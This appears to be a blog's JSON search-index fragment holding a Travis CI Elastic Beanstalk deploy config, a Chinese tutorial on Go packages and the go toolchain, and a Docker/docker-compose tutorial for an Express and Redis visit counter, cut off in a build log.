12345678910111213141516171819202122sudo: requiredservices: - dockerbefore_install: - docker build -t stephengrider/docker-react -f Dockerfile.dev .script: - docker run stephengrider/docker-react npm run test -- --coveragedeploy: provider: elasticbeanstalk region: &quot;us-east-2&quot; app: &quot;docker-react-aws&quot; env: &quot;DockerReactAws-env&quot; bucket_name: &quot;elasticbeanstalk-us-east-2-943387109564&quot; bucket_path: &quot;docker-react-aws&quot; on: branch: master access_key_id: $AWS_ACCESS_KEY secret_access_key: secure: &quot;$AWS_SECRET_KEY&quot;","categories":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/tags/docker/"}]},{"title":"golang[65]-package包","slug":"golang-65-package","date":"2019-02-26T03:01:31.000Z","updated":"2019-03-05T03:39:05.763Z","comments":true,"path":"2019/02/26/golang-65-package/","link":"","permalink":"https://dreamerjonson.com/2019/02/26/golang-65-package/","excerpt":"","text":"现在随便一个小程序的实现都可能包含超过10000个函数。然而作者一般只需要考虑其中很小的一部分和做很少的设计，因为绝大部分代码都是由他人编写的，它们通过类似包或模块的方式被重用。 Go语言有超过100个的标准包（译注：可以用go list std | wc -l命令查看标准包的具体数目），标准库为大多数的程序提供了必要的基础构件。在Go的社区，有很多成熟的包被设计、共享、重用和改进，目前互联网上已经发布了非常多的Go语音开源包，它们可以通过http://godoc.org检索。在本章，我们将演示如果使用已有的包和创建新的包。 包简介 任何包系统设计的目的都是为了简化大型程序的设计和维护工作，通过将一组相关的特性放进一个独立的单元以便于理解和更新，在每个单元更新的同时保持和程序中其它单元的相对独立性。这种模块化的特性允许每个包可以被其它的不同项目共享和重用，在项目范围内、甚至全球范围统一的分发和复用。 每个包一般都定义了一个不同的名字空间用于它内部的每个标识符的访问。每个名字空间关联到一个特定的包，让我们给类型、函数等选择简短明了的名字，这样可以避免在我们使用它们的时候减少和其它部分名字的冲突。 每个包还通过控制包内名字的可见性和是否导出来实现封装特性。通过限制包成员的可见性并隐藏包API的具体实现，将允许包的维护者在不影响外部包用户的前提下调整包的内部实现。通过限制包内变量的可见性，还可以强制用户通过某些特定函数来访问和更新内部变量，这样可以保证内部变量的一致性和并发时的互斥约束。 当我们修改了一个源文件，我们必须重新编译该源文件对应的包和所有依赖该包的其他包。卽使是从头构建，Go语言编译器的编译速度也明显快于其它编译语言。Go语言的闪电般的编译速度主要得益于三个语言特性。第一点，所有导入的包必须在每个文件的开头显式声明，这样的话编译器就没有必要读取和分析整个源文件来判断包的依赖关系。第二点，禁止包的环状依赖，因为没有循环依赖，包的依赖关系形成一个有向无环图，每个包可以被独立编译，而且很可能是被并发编译。第三点，编译后包的目标文件不仅仅记录包本身的导出信息，目标文件同时还记录了包的依赖关系。因此，在编译一个包的时候，编译器只需要读取每个直接导入包的目标文件，而不需要遍历所有依赖的的文件（译注：很多都是重复的间接依赖）。 每个包是由一个全局唯一的字符串所标识的导入路径定位。出现在import语句中的导入路径也是字符串。 123456789import ( &quot;fmt&quot; &quot;math/rand&quot; &quot;encoding/json&quot; &quot;golang.org/x/net/html&quot; &quot;github.com/go-sql-driver/mysql&quot;) 就像我们在2.6.1节提到过的，Go语言的规范并没有指明包的导入路径字符串的具体含义，导入路径的具体含义是由构建工具来解释的。在本章，我们将深入讨论Go语言工具箱的功能，包括大家经常使用的构建测试等功能。当然，也有第三方扩展的工具箱存在。例如，Google公司内部的Go语言码农，他们就使用内部的多语言构建系统（译注：Google公司使用的是类似Bazel的构建系统，支持多种编程语言，目前该构件系统还不能完整支持Windows环境） ，用不同的规则来处理包名字和定位包，用不同的规则来处理单元测试等等，因为这样可以更紧密适配他们内部环境。 如果你计划分享或发布包，那么导入路径最好是全球唯一的。为了避免冲突，所有非标准库包的导入路径建议以所在组织的互联网域名为前缀；而且这样也有利于包的检索。例如，上面的import语句导入了Go团队维护的HTML解析器和一个流行的第三方维护的MySQL驱动。 包声明 在每个Go语音源文件的开头都必须有包声明语句。包声明语句的主要目的是确定当前包被其它包导入时默认的标识符（也称为包名）。 例如，math/rand包的每个源文件的开头都包含package rand包声明语句，所以当你导入这个包，你就可以用rand.Int、rand.Float64类似的方式访问包的成员。 12345678910package mainimport ( &quot;fmt&quot; &quot;math/rand&quot;)func main() &#123; fmt.Println(rand.Int())&#125; 通常来说，默认的包名就是包导入路径名的最后一段，因此卽使两个包的导入路径不同，它们依然可能有一个相同的包名。例如，math/rand包和crypto/rand包的包名都是rand。稍后我们将看到如何同时导入两个有相同包名的包。 关于默认包名一般采用导入路径名的最后一段的约定也有三种例外情况。第一个例外，包对应一个可执行程序，也就是main包，这时候main包本身的导入路径是无关紧要的。名字为main的包是给go build（§10.7.3）构建命令一个信息，这个包编译完之后必须调用连接器生成一个可执行程序。 第二个例外，包所在的目录中可能有一些文件名是以test.go为后缀的Go源文件（译注：前面必须有其它的字符，因为以前缀的源文件是被忽略的） ，并且这些源文件声明的包名也是以_test为后缀名的。这种目录可以包含两种包：一种普通包，加一种则是测试的外部扩展包。所有以_test为后缀包名的测试外部扩展包都由go test命令独立编译，普通包和测试的外部扩展包是相互独立的。测试的外部扩展包一般用来避免测试代码中的循环导入依赖 第三个例外，一些依赖版本号的管理工具会在导入路径后追加版本号信息，例如&quot;gopkg.in/yaml.v2&quot;。这种情况下包的名字并不包含版本号后缀，而是yaml。 导入声明 可以在一个Go语言源文件包声明语句之后，其它非导入声明语句之前，包含零到多个导入包声明语句。每个导入声明可以单独指定一个导入路径，也可以通过圆括号同时导入多个导入路径。下面两个导入形式是等价的，但是第二种形式更为常见。 import “fmt” import “os” import ( “fmt” “os” ) 导入的包之间可以通过添加空行来分组；通常将来自不同组织的包独自分组。包的导入顺序无关紧要，但是在每个分组中一般会根据字符串顺序排列。（gofmt和goimports工具都可以将不同分组导入的包独立排序。） import ( “fmt” “html/template” “os” &quot;golang.org/x/net/html&quot; &quot;golang.org/x/net/ipv4&quot; ) 如果我们想同时导入两个有着名字相同的包，例如math/rand包和crypto/rand包，那么导入声明必须至少为一个同名包指定一个新的包名以避免冲突。这叫做导入包的重命名。 import ( “crypto/rand” mrand “math/rand” // alternative name mrand avoids conflict ) 导入包的重命名只影响当前的源文件。其它的源文件如果导入了相同的包，可以用导入包原本默认的名字或重命名为另一个完全不同的名字。 导入包重命名是一个有用的特性，它不仅仅只是为了解决名字冲突。如果导入的一个包名很笨重，特别是在一些自动生成的代码中，这时候用一个简短名称会更方便。选择用简短名称重命名导入包时候最好统一，以避免包名混乱。选择另一个包名称还可以帮助避免和本地普通变量名产生冲突。例如，如果文件中已经有了一个名为path的变量，那么我们可以将&quot;path&quot;标准包重命名为pathpkg。 每个导入声明语句都明确指定了当前包和被导入包之间的依赖关系。如果遇到包循环导入的情况，Go语言的构建工具将报告错误。 如果只是导入一个包而并不使用导入的包将会导致一个编译错误。但是有时候我们只是想利用导入包而产生的副作用：它会计算包级变量的初始化表达式和执行导入包的init初始化函数（§2.6.2）。这时候我们需要抑制“unused import”编译错误，我们可以用下划线_来重命名导入的包。像往常一样，下划线_为空白标识符，并不能被访问。 import _ “image/png” // register PNG decoder 这个被称为包的匿名导入。它通常是用来实现一个编译时机制，然后通过在main主程序入口选择性地导入附加的包。 包和命名 在本节中，我们将提供一些关于Go语言独特的包和成员命名的约定。 当创建一个包，一般要用短小的包名，但也不能太短导致难以理解。标准库中最常用的包有bufio、bytes、flag、fmt、http、io、json、os、sort、sync和time等包。 它们的名字都简洁明了。例如，不要将一个类似imageutil或ioutilis的通用包命名为util，虽然它看起来很短小。要尽量避免包名使用可能被经常用于局部变量的名字，这样可能导致用户重命名导入包，例如前面看到的path包。 包名一般采用单数的形式。标准库的bytes、errors和strings使用了复数形式，这是为了避免和预定义的类型冲突，同样还有go/types是为了避免和type关键字冲突。 要避免包名有其它的含义。例如，2.5节中我们的温度转换包最初使用了temp包名，虽然并没有持续多久。但这是一个糟糕的尝试，因为temp几乎是临时变量的同义词。然后我们有一段时间使用了temperature作为包名，虽然名字并没有表达包的眞实用途。最后我们改成了和strconv标准包类似的tempconv包名，这个名字比之前的就好多了。 现在让我们看看如何命名包的成员。由于是通过包的导入名字引入包里面的成员，例如fmt.Println，同时包含了包名和成员名信息。因此，我们一般并不需要关注Println的具体内容，因为fmt包名已经包含了这个信息。当设计一个包的时候，需要考虑包名和成员名两个部分如何很好地配合。下面有一些例子： bytes.Equal flag.Int http.Get json.Marshal 我们可以看到一些常用的命名模式。strings包提供了和字符串相关的诸多操作： 123456789package stringsfunc Index(needle, haystack string) inttype Replacer struct&#123; /* ... */ &#125;func NewReplacer(oldnew ...string) *Replacertype Reader struct&#123; /* ... */ &#125;func NewReader(s string) *Reader 字符串string本身并没有出现在每个成员名字中。因为用户会这样引用这些成员strings.Index、strings.Replacer等。 其它一些包，可能只描述了单一的数据类型，例如html/template和math/rand等，只暴露一个主要的数据结构和与它相关的方法，还有一个以New命名的函数用于创建实例。 1234package rand // &quot;math/rand&quot;type Rand struct&#123; /* ... */ &#125;func New(source Source) *Rand 这可能导致一些名字重复，例如template.Template或rand.Rand，这就是为什么这些种类的包名往往特别短的原因之一。 在另一个极端，还有像net/http包那样含有非常多的名字和种类不多的数据类型，因为它们都是要执行一个复杂的复合任务。尽管有将近二十种类型和更多的函数，但是包中最重要的成员名字却是简单明了的：Get、Post、Handle、Error、Client、Server等。 go工具 本章剩下的部分将讨论Go语言工具箱的具体功能，包括如何下载、格式化、构建、测试和安装Go语言编写的程序。 Go语言的工具箱集合了一系列的功能的命令集。它可以看作是一个包管理器（类似于Linux中的apt和rpm工具），用于包的查询、计算的包依赖关系、从远程版本控制系统和下载它们等任务。它也是一个构建系统，计算文件的依赖关系，然后调用编译器、汇编器和连接器构建程序，虽然它故意被设计成没有标准的make命令那么复杂。它也是一个单元测试和基准测试的驱动程序，我们将在第11章讨论测试话题。 Go语言工具箱的命令有着类似“瑞士军刀”的风格，带着一打子的子命令，有一些我们经常用到，例如get、run、build和fmt等。你可以运行go或go help命令查看内置的帮助文档，为了查询方便，我们列出了最常用的命令： 12345678910111213141516$ go... build compile packages and dependencies clean remove object files doc show documentation for package or symbol env print Go environment information fmt run gofmt on package sources get download and install packages and dependencies install compile and install packages and dependencies list list packages run compile and run Go program test test packages version print Go version vet run go tool vet on packagesUse &quot;go help [command]&quot; for more information about a command. 为了达到零配置的设计目标，Go语言的工具箱很多地方都依赖各种约定。例如，根据给定的源文件的名称，Go语言的工具可以找到源文件对应的包，因为每个目录只包含了单一的包，并且到的导入路径和工作区的目录结构是对应的。给定一个包的导入路径，Go语言的工具可以找到对应的目录中没个实体对应的源文件。它还可以根据导入路径找到存储代码仓库的远程服务器的URL。 工作区结构 对于大多数的Go语言用户，只需要配置一个名叫GOPATH的环境变量，用来指定当前工作目录卽可。当需要切换到不同工作区的时候，只要更新GOPATH就可以了。例如，我们在编写本书时将GOPATH设置为HOME/gobook： export GOPATH=HOME/gobookHOME/gobook HOME/gobook go get gopl.io/… 当你用前面介绍的命令下载本书全部的例子源码之后，你的当前工作区的目录结构应该是这样的： 12345678910111213141516171819202122GOPATH/ src/ gopl.io/ .git/ ch1/ helloworld/ main.go dup/ main.go ... golang.org/x/net/ .git/ html/ parse.go node.go ... bin/ helloworld dup pkg/ darwin_amd64/ ... GOPATH对应的工作区目录有三个子目录。其中src子目录用于存储源代码。每个包被保存在与GOPATH/src的相对路径为包导入路径的子目录中，例如gopl.io/ch1/helloworld相对应的路径目录。我们看到，一个GOPATH工作区的src目录中可能有多个独立的版本控制系统，例如gopl.io和golang.org分别对应不同的Git仓库。其中pkg子目录用于保存编译后的包的目标文件，bin子目录用于保存编译后的可执行程序，例如helloworld可执行程序。 第二个环境变量GOROOT用来指定Go的安装目录，还有它自带的标准库包的位置。GOROOT的目录结构和GOPATH类似，因此存放fmt包的源代码对应目录应该为GOROOT/src/fmt。用户一般不需要设置GOROOT，默认情况下Go语言安装工具会将其设置为安装的目录路径。 其中go env命令用于查看Go语音工具涉及的所有环境变量的值，包括未设置环境变量的默认值。GOOS环境变量用于指定目标操作系统（例如android、linux、darwin或windows），GOARCH环境变量用于指定处理器的类型，例如amd64、386或arm等。虽然GOPATH环境变量是唯一必需要设置的，但是其它环境变量也会偶尔用到。 123456$ go envGOPATH=&quot;/home/gopher/gobook&quot;GOROOT=&quot;/usr/local/go&quot;GOARCH=&quot;amd64&quot;GOOS=&quot;darwin&quot;... 下载包 使用Go语言工具箱的go命令，不仅可以根据包导入路径找到本地工作区的包，甚至可以从互联网上找到和更新包。 使用命令go get可以下载一个单一的包或者用…下载整个子目录里面的每个包。Go语言工具箱的go命令同时计算并下载所依赖的每个包，这也是前一个例子中golang.org/x/net/html自动出现在本地工作区目录的原因。 一旦go get命令下载了包，然后就是安装包或包对应的可执行的程序。我们将在下一节再关注它的细节，现在只是展示整个下载过程是如何的简单。第一个命令是获取golint工具，它用于检测Go源代码的编程风格是否有问题。第二个命令是用golint命令对2.6.2节的gopl.io/ch2/popcount包代码进行编码风格检查。它友好地报告了忘记了包的文档： 1234$ go get github.com/golang/lint/golint$ $GOPATH/bin/golint gopl.io/ch2/popcountsrc/gopl.io/ch2/popcount/main.go:1:1: package comment should be of the form &quot;Package popcount ...&quot; go get命令支持当前流行的托管网站GitHub、Bitbucket和Launchpad，可以直接向它们的版本控制系统请求代码。对于其它的网站，你可能需要指定版本控制系统的具体路径和协议，例如Git或Mercurial。运行go help importpath获取相关的信息。 go get命令获取的代码是眞实的本地存储仓库，而不仅仅只是复制源文件，因此你依然可以使用版本管理工具比较本地代码的变更或者切换到其它的版本。例如golang.org/x/net包目录对应一个Git仓库： 1234$ cd $GOPATH/src/golang.org/x/net$ git remote -vorigin https://go.googlesource.com/net (fetch)origin https://go.googlesource.com/net (push) 需要注意的是导入路径含有的网站域名和本地Git仓库对应远程服务地址并不相同，眞实的Git地址是go.googlesource.com。这其实是Go语言工具的一个特性，可以让包用一个自定义的导入路径，但是眞实的代码却是由更通用的服务提供，例如googlesource.com或github.com。因为页面https://golang.org/x/net/html包含了如下的元数据，它告诉Go语言的工具当前包眞实的Git仓库托管地址： 1234$ go build gopl.io/ch1/fetch$ ./fetch https://golang.org/x/net/html | grep go-import&lt;meta name=&quot;go-import&quot; content=&quot;golang.org/x/net git https://go.googlesource.com/net&quot;&gt; 如果指定-u命令行标志参数，go get命令将确保所有的包和依赖的包的版本都是最新的，然后重新编译和安装它们。如果不包含该标志参数的话，而且如果包已经在本地存在，那么代码那么将不会被自动更新。 go get -u命令只是简单地保证每个包是最新版本，如果是第一次下载包则是比较很方便的；但是对于发布程序则可能是不合适的，因为本地程序可能需要对依赖的包做精确的版本依赖管理。通常的解决方案是使用vendor的目录用于存储依赖包的固定版本的源代码，对本地依赖的包的版本更新也是谨慎和持续可控的。在Go1.5之前，一般需要修改包的导入路径，所以复制后golang.org/x/net/html导入路径可能会变为gopl.io/vendor/golang.org/x/net/html。最新的Go语言命令已经支持vendor特性，但限于篇幅这里并不讨论vendor的具体细节。不过可以通过go help gopath命令查看Vendor的帮助文档。 构建包 go build命令编译命令行参数指定的每个包。如果包是一个库，则忽略输出结果；这可以用于检测包的可以正确编译的。如果包的名字是main，go build将调用连接器在当前目录创建一个可执行程序；以导入路径的最后一段作为可执行程序的名字。 因为每个目录只包含一个包，因此每个对应可执行程序或者叫Unix术语中的命令的包，会要求放到一个独立的目录中。这些目录有时候会放在名叫cmd目录的子目录下面，例如用于提供Go文档服务的golang.org/x/tools/cmd/godoc命令就是放在cmd子目录（§10.7.4）。 每个包可以由它们的导入路径指定，就像前面看到的那样，或者用一个相对目录的路径知指定，相对路径必须以.或…开头。如果没有指定参数，那么默认指定为当前目录对应的包。下面的命令用于构建同一个包,虽然它们的写法各不相同: $ cd GOPATH/src/gopl.io/ch1/helloworldGOPATH/src/gopl.io/ch1/helloworld GOPATH/src/gopl.io/ch1/helloworld go build 或者： $ cd anywhere $ go build gopl.io/ch1/helloworld 或者： $ cd GOPATHGOPATH GOPATH go build ./src/gopl.io/ch1/helloworld 但不能这样： $ cd GOPATHGOPATH GOPATH go build src/gopl.io/ch1/helloworld Error: cannot find package “src/gopl.io/ch1/helloworld”. 也可以指定包的源文件列表，这一般这只用于构建一些小程序或做一些临时性的实验。如果是main包，将会以第一个Go源文件的基础文件名作为最终的可执行程序的名字。 1234567891011121314$ cat quoteargs.gopackage mainimport ( &quot;fmt&quot; &quot;os&quot;)func main() &#123; fmt.Printf(&quot;%q\\n&quot;, os.Args[1:])&#125;$ go build quoteargs.go$ ./quoteargs one &quot;two three&quot; four\\ five[&quot;one&quot; &quot;two three&quot; &quot;four five&quot;] 特别是对于这类一次性运行的程序，我们希望尽快的构建并运行它。go run命令实际上是结合了构建和运行的两个步骤： 12$ go run quoteargs.go one &quot;two three&quot; four\\ five[&quot;one&quot; &quot;two three&quot; &quot;four five&quot;] 第一行的参数列表中，第一个不是以.go结尾的将作为可执行程序的参数运行。 默认情况下，go build命令构建指定的包和它依赖的包，然后丢弃除了最后的可执行文件之外所有的中间编译结果。依赖分析和编译过程虽然都是很快的，但是随着项目增加到几十个包和成千上万行代码，依赖关系分析和编译时间的消耗将变的可观，有时候可能需要几秒种，卽使这些依赖项没有改变。 go install命令和go build命令很相似，但是它会保存每个包的编译成果，而不是将它们都丢弃。被编译的包会被保存到GOPATH/pkg目录下，目录路径和src目录路径对应，可执行程序被保存到GOPATH/bin目录。（很多用户会将GOPATH/bin添加到可执行程序的搜索列表中。）还有，go install命令和go build命令都不会重新编译没有发生变化的包，这可以使后续构建更快捷。为了方便编译依赖的包，go build -i命令将安装每个目标所依赖的包。 因为编译对应不同的操作系统平台和CPU架构，go install命令会将编译结果安装到GOOS和GOARCH对应的目录。例如，在Mac系统，golang.org/x/net/html包将被安装到GOPATH/pkg/darwin_amd64目录下的golang.org/x/net/html.a文件。 针对不同操作系统或CPU的交叉构建也是很简单的。只需要设置好目标对应的GOOS和GOARCH，然后运行构建命令卽可。下面交叉编译的程序将输出它在编译时操作系统和CPU类型： 1234567891011func main() &#123; fmt.Println(runtime.GOOS, runtime.GOARCH)&#125;下面以64位和32位环境分别执行程序：$ go build gopl.io/ch10/cross$ ./crossdarwin amd64$ GOARCH=386 go build gopl.io/ch10/cross$ ./crossdarwin 386 有些包可能需要针对不同平台和处理器类型使用不同版本的代码文件，以便于处理底层的可移植性问题或提供为一些特定代码提供优化。如果一个文件名包含了一个操作系统或处理器类型名字，例如net_linux.go或asm_amd64.s，Go语言的构建工具将只在对应的平台编译这些文件。还有一个特别的构建注释注释可以提供更多的构建过程控制。例如，文件中可能包含下面的注释： // +build linux darwin 在包声明和包注释的前面，该构建注释参数告诉go build只在编译程序对应的目标操作系统是Linux或Mac OS X时才编译这个文件。下面的构建注释则表示不编译这个文件： // +build ignore 更多细节，可以参考go/build包的构建约束部分的文档。 $ go doc go/build 包文档 Go语言的编码风格鼓励为每个包提供良好的文档。包中每个导出的成员和包声明前都应该包含目的和用法说明的注释。 Go语言中包文档注释一般是完整的句子，第一行是包的摘要说明，注释后仅跟着包声明语句。注释中函数的参数或其它的标识符并不需要额外的引号或其它标记注明。例如，下面是fmt.Fprintf的文档注释。 // Fprintf formats according to a format specifier and writes to w. // It returns the number of bytes written and any write error encountered. func Fprintf(w io.Writer, format string, a …interface{}) (int, error) Fprintf函数格式化的细节在fmt包文档中描述。如果注释后仅跟着包声明语句，那注释对应整个包的文档。包文档对应的注释只能有一个（译注：其实可以有多个，它们会组合成一个包文档注释），包注释可以出现在任何一个源文件中。如果包的注释内容比较长，一般会放到一个独立的源文件中；fmt包注释就有300行之多。这个专门用于保存包文档的源文件通常叫doc.go。 好的文档并不需要面面俱到，文档本身应该是简洁但可不忽略的。事实上，Go语言的风格更喜欢简洁的文档，并且文档也是需要像代码一样维护的。对于一组声明语句，可以用一个精炼的句子描述，如果是显而易见的功能则并不需要注释。 在本书中，只要空间允许，我们之前很多包声明都包含了注释文档，但你可以从标准库中发现很多更好的例子。有两个工具可以帮到你。 首先是go doc命令，该命令打印包的声明和每个成员的文档注释，下面是整个包的文档： 12345678910111213$ go doc timepackage time // import &quot;time&quot;Package time provides functionality for measuring and displaying time.const Nanosecond Duration = 1 ...func After(d Duration) &lt;-chan Timefunc Sleep(d Duration)func Since(t Time) Durationfunc Now() Timetype Duration int64type Time struct &#123; ... &#125;...many more... 或者是某个具体包成员的注释文档： 12345$ go doc time.Sincefunc Since(t Time) Duration Since returns the time elapsed since t. It is shorthand for time.Now().Sub(t). 或者是某个具体包的一个方法的注释文档： 1234$ go doc time.Duration.Secondsfunc (d Duration) Seconds() float64 Seconds returns the duration as a floating-point number of seconds. 该命令并不需要输入完整的包导入路径或正确的大小写。下面的命令将打印encoding/json包的(*json.Decoder).Decode方法的文档： 123456789$ go doc json.decodefunc (dec *Decoder) Decode(v interface&#123;&#125;) error Decode reads the next JSON-encoded value from its input and stores it in the value pointed to by v.第二个工具，名字也叫godoc，它提供可以相互交叉引用的HTML页面，但是包含和go doc命令相同以及更多的信息。10.1节演示了time包的文档，11.6节将看到godoc演示可以交互的示例程序。godoc的在线服务https://godoc.org，包含了成千上万的开源包的检索工具。你也可以在自己的工作区目录运行godoc服务。运行下面的命令，然后在浏览器查看http://localhost:8000/pkg页面：$ godoc -http :8000其中-analysis=type和-analysis=pointer命令行标志参数用于打开文档和代码中关于静态分析的结果。 内部包 在Go语音程序中，包的封装机制是一个重要的特性。没有导出的标识符只在同一个包内部可以访问，而导出的标识符则是面向全宇宙都是可见的。 有时候，一个中间的状态可能也是有用的，对于一小部分信任的包是可见的，但并不是对所有调用者都可见。例如，当我们计划将一个大的包拆分为很多小的更容易维护的子包，但是我们并不想将内部的子包结构也完全暴露出去。同时，我们可能还希望在内部子包之间共享一些通用的处理包，或者我们只是想实验一个新包的还并不稳定的接口，暂时只暴露给一些受限制的用户使用。 为了满足这些需求，Go语言的构建工具对包含internal名字的路径段的包导入路径做了特殊处理。这种包叫internal包，一个internal包只能被和internal目录有同一个父目录的包所导入。例如，net/http/internal/chunked内部包只能被net/http/httputil或net/http包导入，但是不能被net/url包导入。不过net/url包却可以导入net/http/httputil包。 net/http net/http/internal/chunked net/http/httputil net/url 查询包 go list命令可以查询可用包的信息。其最简单的形式，可以测试包是否在工作区并打印它的导入路径： 12$ go list github.com/go-sql-driver/mysqlgithub.com/go-sql-driver/mysql go list命令的参数还可以用&quot;…&quot;表示匹配任意的包的导入路径。我们可以用它来列表工作区中的所有包： 12345678$ go list ...archive/tararchive/zipbufiobytescmd/addr2linecmd/api...many more... 或者是特定子目录下的所有包： 12345678$ go list gopl.io/ch3/...gopl.io/ch3/basename1gopl.io/ch3/basename2gopl.io/ch3/commagopl.io/ch3/mandelbrotgopl.io/ch3/netflaggopl.io/ch3/printintsgopl.io/ch3/surface 或者是和某个主题相关的所有包: 123$ go list ...xml...encoding/xmlgopl.io/ch7/xmlselect go list命令还可以获取每个包完整的元信息，而不仅仅只是导入路径，这些元信息可以以不同格式提供给用户。其中-json命令行参数表示用JSON格式打印每个包的元信息。 12345678910111213141516171819202122232425$ go list -json hash&#123; &quot;Dir&quot;: &quot;/home/gopher/go/src/hash&quot;, &quot;ImportPath&quot;: &quot;hash&quot;, &quot;Name&quot;: &quot;hash&quot;, &quot;Doc&quot;: &quot;Package hash provides interfaces for hash functions.&quot;, &quot;Target&quot;: &quot;/home/gopher/go/pkg/darwin_amd64/hash.a&quot;, &quot;Goroot&quot;: true, &quot;Standard&quot;: true, &quot;Root&quot;: &quot;/home/gopher/go&quot;, &quot;GoFiles&quot;: [ &quot;hash.go&quot; ], &quot;Imports&quot;: [ &quot;io&quot; ], &quot;Deps&quot;: [ &quot;errors&quot;, &quot;io&quot;, &quot;runtime&quot;, &quot;sync&quot;, &quot;sync/atomic&quot;, &quot;unsafe&quot; ]&#125; 命令行参数-f则允许用户使用text/template包（§4.6）的模板语言定义输出文本的格式。下面的命令将打印strconv包的依赖的包，然后用join模板函数将结果链接为一行，连接时每个结果之间用一个空格分隔： 12$ go list -f &apos;&#123;&#123;join .Deps &quot; &quot;&#125;&#125;&apos; strconverrors math runtime unicode/utf8 unsafe 译注：上面的命令在Windows的命令行运行会遇到template: main:1: unclosed action的错误。产生这个错误的原因是因为命令行对命令中的&quot; &quot;参数进行了转义处理。可以按照下面的方法解决转义字符串的问题： 1$ go list -f &quot;&#123;&#123;join .Deps \\&quot; \\&quot;&#125;&#125;&quot; strconv 下面的命令打印compress子目录下所有包的依赖包列表： 123456$ go list -f &apos;&#123;&#123;.ImportPath&#125;&#125; -&gt; &#123;&#123;join .Imports &quot; &quot;&#125;&#125;&apos; compress/...compress/bzip2 -&gt; bufio io sortcompress/flate -&gt; bufio fmt io math sort strconvcompress/gzip -&gt; bufio compress/flate errors fmt hash hash/crc32 io timecompress/lzw -&gt; bufio errors fmt iocompress/zlib -&gt; bufio compress/flate errors fmt hash hash/adler32 io 译注：Windows下有同样有问题，要避免转义字符串的干扰： 1$ go list -f &quot;&#123;&#123;.ImportPath&#125;&#125; -&gt; &#123;&#123;join .Imports \\&quot; \\&quot;&#125;&#125;&quot; compress/... go list命令对于一次性的交互式查询或自动化构建或测试脚本都很有帮助。我们将在11.2.4节中再次使用它。每个子命令的更多信息，包括可设置的字段和意义，可以用go help list命令查看。 在本章，我们解释了Go语言工具中除了测试命令之外的所有重要的子命令。在下一章，我们将看到如何用go test命令去运行Go语言程序中的测试代码。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"docker[3]-真实web应用","slug":"docker-webserver","date":"2019-02-25T12:57:42.000Z","updated":"2019-03-14T14:13:15.152Z","comments":true,"path":"2019/02/25/docker-webserver/","link":"","permalink":"https://dreamerjonson.com/2019/02/25/docker-webserver/","excerpt":"","text":"index.js: 1234567891011121314151617181920const express = require('express');const redis = require('redis');const app = express();const client = redis.createClient(&#123; host:'redis-server', // 配合docker-compose使用。//自动连接docker中的后台主机名为redis-server的服务器，默认端口为6379 port:6379&#125;);client.set('visits', 0);app.get('/', (req, res) =&gt; &#123; client.get('visits', (err, visits) =&gt; &#123; res.send('Number of visits is ' + visits); client.set('visits', parseInt(visits) + 1); &#125;);&#125;);app.listen(8081, () =&gt; &#123; console.log('Listening on port 8081');&#125;); package.json 123456789&#123; \"dependencies\": &#123; \"express\": \"*\", \"redis\": \"2.8.0\" &#125;, \"scripts\": &#123; \"start\": \"node index.js\" &#125;&#125; Dockerfile 123456789FROM node:alpineWORKDIR &apos;/app&apos;COPY package.json .RUN npm installCOPY . .CMD [&quot;npm&quot;,&quot;start&quot;] 1234567891011121314151617181920212223242526272829$ docker build -t zhuimengshaonian04/webtest:latest .Sending build context to Docker daemon 4.096kBStep 1/6 : FROM node:alpine ---&gt; 4e50ad7c0e0bStep 2/6 : WORKDIR &apos;/app&apos; ---&gt; Using cache ---&gt; e99f36e2e99dStep 3/6 : COPY package.json . ---&gt; 2b85c0cb1430Step 4/6 : RUN npm install ---&gt; Running in a4e0904bb389npm notice created a lockfile as package-lock.json. You should commit this file.npm WARN app No descriptionnpm WARN app No repository field.npm WARN app No license field.added 52 packages from 40 contributors and audited 125 packages in 11.86sfound 0 vulnerabilitiesRemoving intermediate container a4e0904bb389 ---&gt; c479e4e9544dStep 5/6 : COPY . . ---&gt; e270a6054ebdStep 6/6 : CMD [&quot;npm&quot;,&quot;start&quot;] ---&gt; Running in 46558e1f9bbfRemoving intermediate container 46558e1f9bbf ---&gt; 862676d2443eSuccessfully built 862676d2443eSuccessfully tagged zhuimengshaonian04/webtest:latest docker-compose.yml 独立的客户端。docker-compose可以避免繁琐的docker命令，并且让多个container相互通信 12345678version : '3'services: redis-server: #服务器名字 image: 'redis' node-app: #服务器名字 build: . # 使用Dockerfile中的 ports: - \"4001:8081\" #真实端口4001转移到docker端口8081 开启docker-compose 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950$ docker-compose upCreating network &quot;visits2_default&quot; with the default driverBuilding node-appStep 1/6 : FROM node:alpine ---&gt; 4e50ad7c0e0bStep 2/6 : WORKDIR &apos;/app&apos; ---&gt; Using cache ---&gt; e99f36e2e99dStep 3/6 : COPY package.json . ---&gt; f58dd6549a9cStep 4/6 : RUN npm install ---&gt; Running in d24b1cc9a3c1npm notice created a lockfile as package-lock.json. You should commit this file.npm WARN app No descriptionnpm WARN app No repository field.npm WARN app No license field.added 52 packages from 40 contributors and audited 125 packages in 7.725sfound 0 vulnerabilitiesRemoving intermediate container d24b1cc9a3c1 ---&gt; 43ff230ce2d5Step 5/6 : COPY . . ---&gt; bd09786967c4Step 6/6 : CMD [&quot;npm&quot;,&quot;start&quot;] ---&gt; Running in d244a10ca082Removing intermediate container d244a10ca082 ---&gt; 7f254839bf80Successfully built 7f254839bf80Successfully tagged visits2_node-app:latestWARNING: Image for service node-app was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.Creating visits2_node-app_1 ... doneCreating visits2_redis-server_1 ... doneAttaching to visits2_redis-server_1, visits2_node-app_1redis-server_1 | 1:C 26 Feb 01:43:22.949 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Ooredis-server_1 | 1:C 26 Feb 01:43:22.955 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=1, just startedredis-server_1 | 1:C 26 Feb 01:43:22.955 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.confredis-server_1 | 1:M 26 Feb 01:43:22.957 * Running mode=standalone, port=6379.redis-server_1 | 1:M 26 Feb 01:43:22.957 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower 